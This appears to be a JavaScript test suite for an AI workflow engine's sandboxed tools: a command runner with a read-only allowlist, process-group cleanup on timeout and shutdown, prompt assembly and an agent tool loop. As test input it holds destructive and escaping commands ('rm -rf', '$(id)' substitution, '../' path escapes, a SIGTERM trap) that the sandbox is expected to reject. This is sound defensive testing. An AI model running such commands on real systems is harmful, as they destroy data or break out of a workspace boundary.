    assert.equal((await call('search_text', { pattern: 'needle', glob: '*.ts' }, root)).payload.matchCount, 0, '* 不跨目录，与 find_files 同口径');
    assert.equal((await call('search_text', { pattern: 'needle', glob: '   ' }, root)).payload.reason, 'bad-pattern');
    assert.equal((await call('search_text', { pattern: 'needle', path: 'missing' }, root)).payload.reason, 'not-found');
  } finally { dispose(); }
});

// ═══════════════════════════════════════════════════════════════
// 七、执行工具实测——白名单、危险拒因、有界超时、后台、进程组收（AC1 / AC7）
// ═══════════════════════════════════════════════════════════════

const skipOnWin = process.platform === 'win32';

function alive(pid) {
  try {
    process.kill(pid, 0);
    return true;
  } catch (error) {
    return error.code === 'EPERM';
  }
}

async function waitUntilGone(pid, timeoutMs = 3_000) {
  const deadline = Date.now() + timeoutMs;
  while (alive(pid) && Date.now() < deadline) await new Promise((resolve) => setTimeout(resolve, 10));
  return !alive(pid);
}

test('执行面：只读面放行白名单读命令，回结构化 JSON 与实际生效的超时值', async () => {
  const root = workspace();
  try {
    const result = await call('execute_cli', { command: 'echo hi' }, root);
    assert.equal(result.isError, false);
    assert.equal(result.payload.ok, true);
    assert.equal(result.payload.stdout.trim(), 'hi');
    assert.equal(result.payload.exitCode, 0);
    assert.equal(result.payload.timeoutSec, DEFAULT_EXECUTE_TIMEOUT_SEC);
    assert.equal(result.payload.truncated, false);
    assert.equal(result.payload.stdoutChars, 3);
    assert.equal((await call('execute_cli', { command: 'echo hi', timeoutSec: 99_999 }, root)).payload.timeoutSec, MAX_EXECUTE_TIMEOUT_SEC, '上限夹回');
    assert.equal((await call('execute_cli', { command: 'echo hi', timeoutSec: 0 }, root)).payload.timeoutSec, 1, '下限夹到 1 秒');
  } finally { dispose(); }
});

test('执行面：只读面的写副作用形态一律拒，各带自己的具名拒因', async () => {
  const root = workspace();
  try {
    assert.equal((await call('execute_cli', { command: 'touch newfile' }, root)).payload.reason, 'not-in-read-only-allowlist');
    assert.equal((await call('execute_cli', { command: 'echo x > planted.txt' }, root)).payload.reason, 'not-in-read-only-allowlist');
    assert.equal((await call('execute_cli', { command: 'rm -rf build' }, root)).payload.reason, 'dangerous-command');
    assert.equal((await call('execute_cli', { command: 'echo $(id)' }, root)).payload.reason, 'command-substitution');
    assert.equal((await call('execute_cli', { command: '   ' }, root)).payload.reason, 'empty-command');
    assert.equal((await call('execute_cli', { command: 'ls', cwd: '../' }, root)).payload.reason, 'outside-boundary');
    assert.equal(fs.existsSync(path.join(root, 'newfile')), false, '被拒的命令一个字都不许落地');
    assert.equal((await call('execute_cli', { command: 'ls', nope: 1 }, root)).payload.reason, 'bad-tool-input');
  } finally { dispose(); }
});

test('执行面：floor 外的工具名与 floor 内的工具名各回一条具名拒因', async () => {
  const root = workspace();
  try {
    const fanOut = await call('workflow_start', { script: 'x' }, root);
    assert.equal(fanOut.isError, true);
    assert.equal(fanOut.payload.reason, 'floor-tool-forbidden');
    assert.match(fanOut.payload.error, /cannot start another run/);
    const message = await call('message_send', { to: 'parent', body: 'hi' }, root);
    assert.equal(message.payload.reason, 'floor-tool-forbidden');
    const ledger = await call('task_create', { subject: 'x', description: 'y' }, root);
    assert.equal(ledger.payload.reason, 'floor-tool-forbidden');
    const ask = await call('ask_user_question', { question: 'ok?' }, root);
    assert.equal(ask.payload.reason, 'floor-tool-forbidden');
    const unknown = await call('read_and_write_file', { path: 'a' }, root);
    assert.equal(unknown.payload.reason, 'tool-not-on-this-face');
    assert.match(unknown.payload.available, /read_file/);
  } finally { dispose(); }
});

test.skipIf(skipOnWin)('执行面：有界超时到点收进程组，孙进程一起收，产出的部分照实带回', async () => {
  const root = workspace();
  try {
    const started = Date.now();
    const result = await call('execute_cli', { command: 'sleep 30', timeoutSec: 1 }, root, { mode: 'worktree' });
    const elapsed = Date.now() - started;
    assert.equal(result.isError, true);
    assert.equal(result.payload.reason, 'timeout');
    assert.equal(result.payload.timeoutSec, 1);
    assert.equal(elapsed < 5_000, true, `到点即收，不等满 30 秒（实测 ${elapsed}ms）`);
    const leftovers = listCommands();
    assert.deepEqual(leftovers, [], '超时收完不留账');
  } finally { dispose(); }
});

test.skipIf(skipOnWin)('执行面：中止信号即收——该路回具名 aborted，账本不留无主命令树', async () => {
  const root = workspace();
  try {
    const { context, controller } = contextFor(root, { mode: 'worktree' });
    const pending = run('execute_cli', { command: 'sleep 30', timeoutSec: 30 }, context);
    await until(async () => listCommands({ runId: context.runId, dispatchId: context.dispatchId }).length === 1, '命令登记上账');
    controller.abort();
    const result = await pending;
    assert.equal(result.isError, true);
    assert.equal(result.payload.reason, 'aborted');
    assert.deepEqual(listCommands({ runId: context.runId, dispatchId: context.dispatchId }), [], '中止后不留无主命令树');
  } finally { dispose(); }
});

test.skipIf(skipOnWin)('执行面：随路收组——连 shell 自己派生的孙进程一起收', async () => {
  const root = workspace();
  try {
    const { context } = contextFor(root, { mode: 'worktree' });
    const started = await run('execute_cli', { command: 'sleep 30 & echo $!; wait', run_in_background: true }, context);
    assert.equal(started.payload.ok, true);
    const shellPid = started.payload.pid;
    await until(async () => {
      try { return /\d/.test(fs.readFileSync(started.payload.outputPath, 'utf8')); } catch { return false; }
    }, '孙进程 pid 落进输出文件');
    const grandchildPid = Number(fs.readFileSync(started.payload.outputPath, 'utf8').trim().split(/\s+/)[0]);
    assert.equal(alive(grandchildPid), true, '收之前孙进程活着');
    const collected = await collectOwnerCommands({ runId: context.runId, dispatchId: context.dispatchId }, 200);
    assert.equal(collected, 1);
    assert.equal(await waitUntilGone(shellPid), true, 'shell 走了');
    assert.equal(await waitUntilGone(grandchildPid), true, '单杀 shell 就会漏掉它——按组收才成立');
  } finally { dispose(); }
});

test.skipIf(skipOnWin)('执行面：后台起一条即回句柄与输出文件，输出落盘可回看', async () => {
  const root = workspace();
  try {
    const { context } = contextFor(root, { mode: 'worktree' });
    const result = await run('execute_cli', { command: 'echo out-to-file', run_in_background: true }, context);
    assert.equal(result.payload.ok, true);
    assert.match(result.payload.backgroundId, /^cmd_[0-9a-f-]{8}$/);
    assert.equal(typeof result.payload.pid, 'number');
    assert.equal(result.payload.outputPath.startsWith(context.run.bgDir), true, '输出落在本 run 的 bg 目录');
    assert.equal(getCommand(result.payload.backgroundId).backgrounded, true);
    await until(async () => {
      try { return /out-to-file/.test(fs.readFileSync(result.payload.outputPath, 'utf8')); } catch { return false; }
    }, '输出落进文件');
    await until(async () => getCommand(result.payload.backgroundId)?.endedAt !== undefined, '短命令退出并落时间戳');
    const collected = await collectOwnerCommands({ runId: context.runId, dispatchId: context.dispatchId });
    assert.equal(collected, 0, '已退出的记录不再收，只等记录窗清理');
  } finally { dispose(); }
});

test('执行面：读回后台输出的路径同样受双检约束，越界即拒', async () => {
  const root = workspace();
  const outside = workspace();
  try {
    fs.writeFileSync(path.join(outside, 'leak.txt'), 'x');
    const { context } = contextFor(root);
    const result = await run('read_file', { path: path.relative(root, path.join(outside, 'leak.txt')) }, context);
    assert.equal(result.payload.reason, 'outside-boundary');
  } finally { dispose(); }
});

// ═══════════════════════════════════════════════════════════════
// 八、命令树账本——停接单、按组收、宽限、1h 记录窗（AC7）
// ═══════════════════════════════════════════════════════════════

test('账本：默认窗口照既有 subagent 记录 TTL 同值，注入只用于测试', () => {
  assert.equal(BACKGROUND_RECORD_TTL_MS, 60 * 60 * 1000);
  assert.equal(getBackgroundRecordTtlMs(), BACKGROUND_RECORD_TTL_MS);
  setBackgroundRecordTtlMs(50);
  assert.equal(getBackgroundRecordTtlMs(), 50);
  assert.throws(() => setBackgroundRecordTtlMs(0), /positive finite/);
  assert.throws(() => setBackgroundRecordTtlMs(Number.NaN), /positive finite/);
  resetCommandLedger();
});

test.skipIf(skipOnWin)('账本：优雅关机三步——停接单、收在飞树、有限宽限，之后的新命令一律拒', async () => {
  const root = workspace();
  try {
    const { context } = contextFor(root, { mode: 'worktree' });
    const started = await run('execute_cli', { command: 'sleep 30', run_in_background: true }, context);
    assert.equal(started.payload.ok, true);
    const pid = started.payload.pid;
    assert.equal(alive(pid), true);
    assert.equal(isAcceptingCommands(), true);
    const summary = await shutdownCommandTrees({ graceMs: 300 });
    assert.equal(summary.collected, 1);
    assert.equal(summary.remaining, 0);
    assert.equal(summary.graceMs, 300);
    assert.equal(isAcceptingCommands(), false, '停接单是关机第一步');
    assert.equal(alive(pid), false, '关机后进程组真走了');
    const refused = await run('execute_cli', { command: 'echo hi' }, context);
    assert.equal(refused.payload.reason, 'shutting-down');
    resetCommandLedger();
    assert.equal(isAcceptingCommands(), true);
  } finally { dispose(); }
});

test.skipIf(skipOnWin)('账本：过期记录按注入窗清理，还在跑的记录不动（宁留账不丢线索）', async () => {
  const root = workspace();
  try {
    const { context } = contextFor(root, { mode: 'worktree' });
    const started = await run('execute_cli', { command: 'sleep 30', run_in_background: true }, context);
    setBackgroundRecordTtlMs(20);
    assert.equal(pruneCommandRecords(Date.now() + 10_000), 0, '还在跑的记录不删');
    await collectOwnerCommands({ runId: context.runId, dispatchId: context.dispatchId }, 200);
    const quick = await run('execute_cli', { command: 'echo done', run_in_background: true }, context);
    await until(async () => getCommand(quick.payload.backgroundId)?.endedAt !== undefined, '短命令落下退出时间');
    assert.equal(pruneCommandRecords(Date.now() + 50), 1, '退出且过窗即清');
    resetCommandLedger();
  } finally { dispose(); }
});

test('账本：停接单是进程级关机态——新建引擎即重新开闸', async () => {
  const root = workspace();
  try {
    stopAcceptingCommands();
    assert.equal(isAcceptingCommands(), false);
    assert.equal((await call('execute_cli', { command: 'echo hi' }, root)).payload.reason, 'shutting-down');
    const { WorkflowEngine } = await import('../dist/workflows/engine.js');
    new WorkflowEngine({ workspaceDir: root, managedRoot: path.join(root, '.myterminal') });
    assert.equal(isAcceptingCommands(), true, '有引擎在跑 = 宿主愿意接单');
    assert.equal((await call('execute_cli', { command: 'echo hi' }, root)).payload.ok, true);
  } finally { dispose(); }
});

test('账本：收不存在的句柄即成立，ownerKey 拼法稳定', async () => {
  assert.equal(ownerKey('wf_1', 'd0001'), 'wf_1/d0001');
  assert.equal(await collectCommand('cmd_missing'), true);
  assert.equal(await collectOwnerCommands({ runId: 'wf_none', dispatchId: 'd9999' }), 0);
  assert.equal(await collectRunCommands('wf_none'), 0);
});

test.skipIf(skipOnWin)('账本：装死不理 SIGTERM 的命令，宽限之后按组补一刀 SIGKILL', async () => {
  const root = workspace();
  try {
    const { context } = contextFor(root, { mode: 'worktree' });
    const started = await run('execute_cli', { command: 'trap "" TERM; sleep 40', run_in_background: true }, context);
    assert.equal(started.payload.ok, true, JSON.stringify(started.payload));
    const pid = started.payload.pid;
    await until(async () => alive(pid), '命令起来');
    const collected = await collectCommand(started.payload.backgroundId, 60);
    assert.equal(collected, true, 'SIGTERM 被无视也要收掉');
    assert.equal(alive(pid), false);
  } finally { dispose(); }
});

// ═══════════════════════════════════════════════════════════════
// 十一、边角补齐——帽、跳过、起不来的命令（"绝不静默"的另一半）
// ═══════════════════════════════════════════════════════════════

test.skipIf(skipOnWin)('只读工具：读不了的文件各归各的具名拒因', async () => {
  const root = workspace();
  try {
    if (typeof process.getuid === 'function' && process.getuid() === 0) return; // root 无视权限位
    fs.writeFileSync(path.join(root, 'locked.txt'), 'secret');
    fs.chmodSync(path.join(root, 'locked.txt'), 0o000);
    assert.equal((await call('read_file', { path: 'locked.txt' }, root)).payload.reason, 'permission-denied');
    fs.chmodSync(path.join(root, 'locked.txt'), 0o600);
    fs.symlinkSync(path.join(root, 'a'), path.join(root, 'a'));
    const loop = (await call('read_file', { path: 'a' }, root)).payload;
    assert.equal(loop.reason, 'read-failed', JSON.stringify(loop));
    assert.match(loop.error, /Could not read/);
  } finally { dispose(); }
});

test('只读工具：搜索跳过的文件 counted 出来，不静默少搜', async () => {
  const root = workspace();
  try {
    fs.writeFileSync(path.join(root, 'small.txt'), 'needle here');
    fs.writeFileSync(path.join(root, 'big.txt'), 'needle ' + 'z'.repeat(MAX_SEARCH_FILE_BYTES));
    fs.writeFileSync(path.join(root, 'blob.png'), 'needle in a binary');
    const payload = (await call('search_text', { pattern: 'needle' }, root)).payload;
    assert.equal(payload.matchCount, 1);
    assert.equal(payload.skippedFiles, 2, '超大与二进制各算一次跳过');
  } finally { dispose(); }
});

test('只读工具：glob 转正则的三种形状与遍历上限（跨目录 / 单字符 / 字面量）', () => {
  const root = workspace();
  try {
    fs.mkdirSync(path.join(root, 'a', 'b'), { recursive: true });
    for (const file of ['top.ts', path.join('a', 'mid.ts'), path.join('a', 'b', 'deep.ts')]) fs.writeFileSync(path.join(root, file), '');
    assert.equal(globToRegex('a/**').test('a/b'), true, '** 单独收尾时跨目录');
    assert.equal(globToRegex('a/**/deep.ts').test('a/b/deep.ts'), true);
    assert.equal(globToRegex('mi?.ts').test('a/mid.ts'), false, '? 不跨目录且整串锚定');
    assert.equal(globToRegex('mi?.ts').test('mi1.ts'), true);
    assert.equal(globToRegex('top.ts').test('Xtop.ts'), false, '点号按字面');
    assert.deepEqual(walkFiles(root, 2).length, 2, '遍历到帽即停（不多走目录树）');
    assert.equal(walkFiles(root).length, 3);
  } finally { dispose(); }
});

test('只读工具：目录读不动时 list_dir 具名失败，遍历遇不可读子目录即跳过', async () => {
  const root = workspace();
  try {
    if (typeof process.getuid === 'function' && process.getuid() === 0) return;
    fs.mkdirSync(path.join(root, 'nope', 'inner'), { recursive: true });
    fs.writeFileSync(path.join(root, 'visible.txt'), '');
    fs.chmodSync(path.join(root, 'nope'), 0o000);
    try {
      const listed = (await call('list_dir', { path: 'nope' }, root)).payload;
      assert.equal(listed.reason, 'list-failed');
      const found = (await call('find_files', { pattern: '**/*' }, root)).payload;
      assert.equal(found.files, 'visible.txt', '进不去的目录跳过去，能读到的还是要报');
    } finally {
      fs.chmodSync(path.join(root, 'nope'), 0o700);
    }
  } finally { dispose(); }
});

test('只读工具：read_file_range 读不存在的文件与整份读同一条具名拒因', async () => {
  const root = workspace();
  try {
    assert.equal((await call('read_file_range', { path: 'ghost.txt' }, root)).payload.reason, 'not-found');
  } finally { dispose(); }
});

test('入站形状：带 getter 的入参在工具边界上收住，抛错不外溢成 run 级事故', async () => {
  const root = workspace();
  try {
    const nasty = { get path() { throw new Error('boom in a getter'); } };
    const result = await call('read_file', nasty, root);
    assert.equal(result.isError, true);
    assert.equal(result.payload.reason, 'tool-failed');
    assert.match(result.payload.error, /boom in a getter/);
  } finally { dispose(); }
});

test.skipIf(skipOnWin)('执行面：起不来的命令（cwd 是文件）回 spawn-failed，不外溢也不空回', async () => {
  const root = workspace();
  try {
    fs.writeFileSync(path.join(root, 'notafile.txt'), 'x');
    const payload = (await call('execute_cli', { command: 'ls', cwd: 'notafile.txt' }, root)).payload;
    assert.equal(payload.ok, false);
    assert.equal(payload.reason, 'spawn-failed');
    assert.match(payload.error, /could not be started/);
  } finally { dispose(); }
});

test('执行面：中止之后的路不再起新进程，直接回 aborted', async () => {
  const root = workspace();
  try {
    const { context, controller } = contextFor(root);
    controller.abort();
    const payload = (await run('execute_cli', { command: 'echo hi' }, context)).payload;
    assert.equal(payload.reason, 'aborted');
  } finally { dispose(); }
});

test.skipIf(skipOnWin)('执行面：后台输出写字节帽，过帽写一条显式标记后不再攒', async () => {
  const root = workspace();
  try {
    setMaxBackgroundOutputBytes(30);
    const { context } = contextFor(root, { mode: 'worktree' });
    const started = await run('execute_cli', { command: 'echo a-line-that-is-longer-than-thirty-bytes-yes-indeed', run_in_background: true }, context);
    assert.equal(started.payload.ok, true, JSON.stringify(started.payload));
    await until(async () => {
      try { return fs.readFileSync(started.payload.outputPath, 'utf8').includes('output truncated'); } catch { return false; }
    }, '截断标记落进输出文件');
    const written = fs.readFileSync(started.payload.outputPath, 'utf8');
    assert.match(written, /\[output truncated: exceeded 30 bytes\]/);
    assert.equal(written.length < 120, true, '帽就是帽，不是一路攒下去');
  } finally {
    resetMaxBackgroundOutputBytes();
    dispose();
  }
});

test('执行面：后台输出文件开不出来即 background-output-failed，不留半个句柄', async () => {
  const root = workspace();
  try {
    const { context, run: paths } = contextFor(root, { mode: 'worktree' });
    fs.mkdirSync(path.dirname(paths.bgDir), { recursive: true });
    fs.writeFileSync(paths.bgDir, '占住这个名字，bg 就成了文件');
    const payload = (await run('execute_cli', { command: 'echo hi', run_in_background: true }, context)).payload;
    assert.equal(payload.reason, 'background-output-failed');
    assert.match(payload.error, /background output file/);
  } finally { dispose(); }
});

test('适配层：工具块与文本块一起回来，maxTokens 为 0 时取设置档口径', async () => {
  const { llmBackedFactory } = await import('../dist/workflows/adapter.js');
  const seen = [];
  const settings = { enabled: true, model: 'm', baseUrl: 'http://127.0.0.1:9', apiKey: 'k', maxTurns: 700, timeoutSec: 7200, maxParallel: 2, maxOutput: 8_000 };
  const factory = llmBackedFactory(settings, () => ({
    provider: 'fake',
    stream: async function* () { /* 不走流式 */ },
    create: async (params) => {
      seen.push(params);
      return {
        message: { role: 'assistant', content: [{ type: 'text', text: 'looking' }, { type: 'tool_use', id: 'tu_1', name: 'read_file', input: { path: 'a.txt' } }] },
        usage: { input_tokens: 3, output_tokens: 9 },
      };
    },
  }));
  const adapter = factory({ runId: 'wf_1', dispatchId: 'd0001' });
  const result = await adapter.complete({
    system: 'S',
    prompt: 'p',
    maxTokens: 0,
    signal: new AbortController().signal,
    tools: [{ name: 'read_file', description: 'd', input_schema: { type: 'object' } }],
    messages: [{ role: 'user', content: [{ type: 'text', text: 'p' }] }],
  });
  assert.equal(result.text, 'looking');
  assert.deepEqual(result.toolUses, [{ id: 'tu_1', name: 'read_file', input: { path: 'a.txt' } }]);
  assert.equal(result.outputTokens, 9);
  assert.equal(seen[0].maxTokens, 8_000, '0 即回落设置档 maxOutput');
  assert.deepEqual(seen[0].tools.map((tool) => tool.name), ['read_file'], '工具面真的递给端点');
  assert.equal(seen[0].messages.length, 1);
});

test('闸门：额外属性按子 schema 判、枚举与常量按值深比、非法 pattern 点名', () => {
  assert.deepEqual(gateJsonSchema({ a: 'x' }, { type: 'object', additionalProperties: { type: 'string' } }), []);
  assert.deepEqual(gateJsonSchema({ a: 3 }, { type: 'object', additionalProperties: { type: 'string' } }), [{ path: 'a', message: 'expected type string, got number' }]);
  assert.deepEqual(gateJsonSchema({ a: 'x', b: 3 }, { type: 'object', properties: { a: { type: 'string' } }, additionalProperties: { type: 'string' } }), [{ path: 'b', message: 'expected type string, got number' }]);
  assert.deepEqual(gateJsonSchema([{ n: 1 }], { type: 'array', items: { type: 'object', properties: { n: { type: 'number' } }, required: ['n'] } }), []);
  assert.deepEqual(gateJsonSchema([{ n: 'x' }], { enum: [{ n: 1 }, { n: 2 }] }), [{ path: '(root)', message: 'value not in enum' }]);
  assert.deepEqual(gateJsonSchema({ n: 1 }, { enum: [{ n: 1 }] }), [], '对象枚举按结构相等判');
  assert.deepEqual(gateJsonSchema({ n: 1 }, { const: { n: 1 } }), []);
  assert.deepEqual(gateJsonSchema({ n: 2 }, { const: { n: 1 } }), [{ path: '(root)', message: 'value is not the required constant' }]);
  assert.deepEqual(gateJsonSchema('x', { type: 'string', pattern: '(' }), [{ path: '(root)', message: 'schema pattern is not a valid regular expression' }]);
});

test('闸门：不认识的关键词在 items 与 additionalProperties 里也点名', () => {
  assert.deepEqual(unsupportedSchemaKeywords({ type: 'array', items: { type: 'object', minItems: 2 } }), ['minItems']);
  assert.deepEqual(unsupportedSchemaKeywords({ type: 'object', additionalProperties: { oneOf: [] } }), ['oneOf']);
  assert.deepEqual(unsupportedSchemaKeywords({ type: 'array', items: [{ type: 'string', format: 'email' }] }), ['format'], '元组形态的 items 也要逐个看');
});

test('命令面：双引号内层里的转义反斜杠按字面还原，不吞掉递归判定', () => {
  assert.equal(classifyCommand('sh -c "echo a\\\\b && ls"', 'read-only').allowed, true);
  assert.equal(classifyCommand('sh -c "grep -n \\"x\\" f"', 'read-only').allowed, true);
  assert.equal(classifyCommand('sh -c "echo a && rm -rf b"', 'worktree').allowed, false, '还原后仍扫得到危险表');
});


// ═══════════════════════════════════════════════════════════════
// 九、每路系统提示词——五块拼接、模式追加、与会话侧零重合（AC4 / AC8）
// ═══════════════════════════════════════════════════════════════

const PROMPT_INPUT = {
  label: 'gather',
  cwd: '/tmp/wf-prompt',
  platform: 'darwin',
  toolNames: ['read_file', 'execute_cli'],
  mode: 'read-only',
  schema: false,
};

test('提示词：五块按序齐备——角色与任务框架 / 工具用法 / 环境 / 输出约束 / 模式项', () => {
  const prompt = buildAgentSystemPrompt(PROMPT_INPUT);
  const order = ['# Path "gather"', '# Tools on this path', '# Where this path runs', '# How you hand back'];
  const positions = order.map((heading) => prompt.indexOf(heading));
  for (const [index, heading] of order.entries()) {
    assert.equal(positions[index] >= 0, true, `${heading} 必须在`);
    if (index > 0) assert.equal(positions[index] > positions[index - 1], true, `${heading} 排在 ${order[index - 1]} 之后`);
  }
  assert.match(prompt, /one path inside a local workflow run/i);
  assert.match(prompt, /sibling paths/i, '并发同僚的定位写进去');
  assert.match(prompt, /Working directory: \/tmp\/wf-prompt/);
  assert.match(prompt, /Platform: darwin/);
  assert.match(prompt, /Available here: read_file, execute_cli/);
});

test('提示词：输出约束三条硬话——最终文本即返回值、禁确认语、JSON 裸出无围栏', () => {
  const prompt = buildAgentSystemPrompt(PROMPT_INPUT);
  assert.match(prompt, /the text you finish on is the value the script receives/i);
  assert.match(prompt, /no acknowledgement/i);
  assert.match(prompt, /write it bare: no code fence/i);
  assert.equal(prompt.includes('structured_output'), false, '非 schema 模式不提结构化出口');
});

test('提示词：schema 模式加一条出口约束，隔离面追加回报 path + branch', () => {
  const withSchema = buildAgentSystemPrompt({ ...PROMPT_INPUT, schema: true });
  assert.match(withSchema, /must hand back a JSON object through the structured_output tool/i);
  const isolated = buildAgentSystemPrompt({ ...PROMPT_INPUT, mode: 'worktree', branch: 'wf-42' });
  assert.match(isolated, /# Working in an isolated checkout/);
  assert.match(isolated, /branch you changed/i);
  assert.match(isolated, /branch: wf-42/);
  const unbranched = buildAgentSystemPrompt({ ...PROMPT_INPUT, mode: 'worktree' });
  assert.equal(unbranched.includes('branch: wf-42'), false, '不知道分支就不编一个');
});

test('提示词：与会话侧 subagent 提示词零重合——标题不复用、整句不搬运（独立撰写）', async () => {
  const { getSubagentSystemPrompt } = await import('../dist/subagent/executor.js');
  const theirs = getSubagentSystemPrompt('do the task', ['read_file', 'execute_cli'], '/tmp/other');
  const ours = buildAgentSystemPrompt({ ...PROMPT_INPUT, cwd: '/tmp/other', platform: 'darwin' });
  for (const heading of ['# Operating boundaries', '# Doing tasks', '# Using your tools', '# Reporting', '# Environment']) {
    assert.equal(ours.includes(heading), false, `${heading} 是会话侧的骨架，不复用`);
  }
  const theirSentences = theirs.split(/(?<=[.!])\s+/).map((line) => line.trim()).filter((line) => line.length > 40);
  for (const sentence of theirSentences) {
    assert.equal(ours.includes(sentence), false, `整句搬运会让两边锁死在一起：${sentence.slice(0, 40)}…`);
  }
});

// ═══════════════════════════════════════════════════════════════
// 十、每路循环——轮次、工具进出、进展挂起、结构化三次出口即判败（AC3 / AC4）
// ═══════════════════════════════════════════════════════════════

function scriptAdapter(replies) {
  const seen = [];
  return {
    seen,
    complete: async (request) => {
      seen.push(request);
      const reply = replies[seen.length - 1];
      if (typeof reply === 'function') return reply(request, seen.length);
      return reply;
    },
  };
}

const TEXT_ONLY = { text: 'final answer', outputTokens: 4 };

function loopOptions(adapter, context, extra = {}) {
  const face = resolveToolFace({ mode: context.mode, schema: extra.schema !== undefined });
  return {
    adapter,
    system: 'SYS',
    prompt: 'do it',
    maxTokens: 1_000,
    signal: context.signal,
    toolNames: face.names,
    context,
    ...(extra.schema ? { schema: extra.schema } : {}),
    ...(extra.maxRounds !== undefined ? { maxRounds: extra.maxRounds } : {}),
  };
}

test('循环：模型不再调工具即终止，最终文本原样成为该路结果', async () => {
  const root = workspace();
  try {
    const { context } = contextFor(root);
    const adapter = scriptAdapter([TEXT_ONLY]);
    const outcome = await runAgentPath(loopOptions(adapter, context));
    assert.equal(outcome.text, 'final answer');
    assert.equal(outcome.hasStructured, false);
    assert.equal(outcome.rounds, 1);
    assert.equal(outcome.outputTokens, 4);
    assert.equal(adapter.seen[0].tools.length, 6, '工具面随请求递出去');
    assert.deepEqual(adapter.seen[0].messages[0].content, [{ type: 'text', text: 'do it' }]);
    assert.equal(adapter.seen[0].system, 'SYS');
  } finally { dispose(); }
});

test('循环：一轮工具进出——assistant 带 tool_use，user 带成批 tool_result，token 逐轮累加', async () => {
  const root = workspace();
  try {
    fs.writeFileSync(path.join(root, 'note.txt'), 'hello note');
    const { context } = contextFor(root);
    const progressCalls = [];
    const progress = { round() { progressCalls.push('round'); }, activity() {}, toolStart() { progressCalls.push('start'); }, toolEnd() { progressCalls.push('end'); } };
    const adapter = scriptAdapter([
      { text: 'let me look', outputTokens: 3, toolUses: [{ id: 'u1', name: 'read_file', input: { path: 'note.txt' } }] },
      TEXT_ONLY,
    ]);
    const outcome = await runAgentPath({ ...loopOptions(adapter, context), progress });
    assert.equal(outcome.text, 'final answer');
    assert.equal(outcome.rounds, 2);
    assert.equal(outcome.outputTokens, 7);
    const assistant = adapter.seen[1].messages[1];
    assert.equal(assistant.role, 'assistant');
    assert.deepEqual(assistant.content.map((block) => block.type), ['text', 'tool_use']);
    const toolResult = adapter.seen[1].messages[2].content[0];
    assert.equal(toolResult.type, 'tool_result');
    assert.equal(toolResult.tool_use_id, 'u1');
    assert.deepEqual({ ...JSON.parse(toolResult.content) }.text, 'hello note');
    assert.equal(toolResult.is_error, false);
    assert.deepEqual(progressCalls, ['start', 'end'], '工具在飞挂起无进展计时');
  } finally { dispose(); }
});

test('循环：floor 外的调用被当面拒给模型，循环照跑下一轮', async () => {
  const root = workspace();
  try {
    const { context } = contextFor(root);
    const adapter = scriptAdapter([
      { text: '', outputTokens: 2, toolUses: [{ id: 'u1', name: 'workflow_start', input: { script: 'x' } }] },
      TEXT_ONLY,
    ]);
    const outcome = await runAgentPath(loopOptions(adapter, context));
    assert.equal(outcome.text, 'final answer');
    const refused = JSON.parse(adapter.seen[1].messages[2].content[0].content);
    assert.equal(refused.ok, false);
    assert.equal(refused.reason, 'floor-tool-forbidden');
  } finally { dispose(); }
});

test('循环：schema 模式经 structured_output 交回对象，成功即终止这一路', async () => {
  const root = workspace();
  try {
    const { context } = contextFor(root);
    const schema = { type: 'object', properties: { n: { type: 'number' } }, required: ['n'], additionalProperties: false };
    const adapter = scriptAdapter([
      { text: '', outputTokens: 2, toolUses: [{ id: 'u1', name: 'structured_output', input: { n: 7 } }] },
      TEXT_ONLY,
    ]);
    const outcome = await runAgentPath(loopOptions(adapter, context, { schema }));
    assert.equal(outcome.hasStructured, true);
    assert.deepEqual(outcome.structured, { n: 7 });
    assert.equal(adapter.seen.length, 1, '提交成功即不再问模型');
    const declaration = adapter.seen[0].tools.find((tool) => tool.name === 'structured_output');
    assert.deepEqual(declaration.input_schema, schema, '出口的入参形状就是这一路的 schema');
  } finally { dispose(); }
});

test('循环：不合形状的提交回错误给模型重试，第三次仍不合即该路判败', async () => {
  const root = workspace();
  try {
    const { context } = contextFor(root);
    const schema = { type: 'object', properties: { n: { type: 'number' } }, required: ['n'] };
    const bad = { text: '', outputTokens: 1, toolUses: [{ id: 'u', name: 'structured_output', input: { n: 'seven' } }] };
    const adapter = scriptAdapter([bad, bad, bad]);
    await assert.rejects(
      () => runAgentPath(loopOptions(adapter, context, { schema })),
      (error) => error.name === 'WorkflowAgentFailedError' && error.kind === 'no_structured_output' && /refused 3/.test(error.message),
    );
    const first = JSON.parse(adapter.seen[1].messages[2].content[0].content);
    assert.equal(first.reason, 'bad-structured-submission');
    assert.match(first.error, /Submission 1 of 3/);
  } finally { dispose(); }
});

test('循环：非 schema 的路点名要 structured_output 即拒，不带次数语义', async () => {
  const root = workspace();
  try {
    const { context } = contextFor(root);
    const adapter = scriptAdapter([
      { text: '', outputTokens: 1, toolUses: [{ id: 'u', name: 'structured_output', input: { a: 1 } }] },
      TEXT_ONLY,
    ]);
    const outcome = await runAgentPath(loopOptions(adapter, context));
    assert.equal(outcome.hasStructured, false);
    const refused = JSON.parse(adapter.seen[1].messages[2].content[0].content);
    assert.equal(refused.ok, false);
    assert.match(refused.error, /no schema/);
  } finally { dispose(); }
});

test('循环：轮数用尽即该路 max_turns 判败（外层看门狗之外的第二道闸）', async () => {
  const root = workspace();
  try {
    const { context } = contextFor(root);
    const looping = { text: '', outputTokens: 1, toolUses: [{ id: 'u', name: 'list_dir', input: {} }] };
    const adapter = scriptAdapter([looping, looping, looping]);
    await assert.rejects(
      () => runAgentPath(loopOptions(adapter, context, { maxRounds: 2 })),
      (error) => error.name === 'WorkflowAgentFailedError' && error.kind === 'max_turns',
    );
    assert.equal(adapter.seen.length, 2, '闸到轮数即停，不再多问一次');
  } finally { dispose(); }
});

test('循环：结构化出口声明与默认轮数闸的口径', () => {
  assert.equal(MAX_FAILED_STRUCTURED_SUBMISSIONS, 3);
  assert.equal(DEFAULT_AGENT_ROUNDS, 50, '与 §6 dispatchTurns 同数');
  const declaration = structuredOutputDeclaration({ type: 'object' });
  assert.equal(declaration.name, 'structured_output');
  assert.deepEqual(declaration.input_schema, { type: 'object' });
});

